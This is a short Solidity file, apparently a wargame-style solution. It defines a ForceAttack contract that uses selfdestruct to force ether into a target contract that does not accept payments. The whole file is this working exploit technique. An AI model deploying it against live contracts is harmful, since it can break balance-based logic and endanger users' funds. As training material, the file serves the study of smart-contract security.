// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Force {

}

contract ForceAttack {
    Force forceContract;

    constructor (Force _forceContract) {
        forceContract = _forceContract;
    }

    function attack() public payable {
        address payable target = payable(address(forceContract));
        selfdestruct(target);
    }
}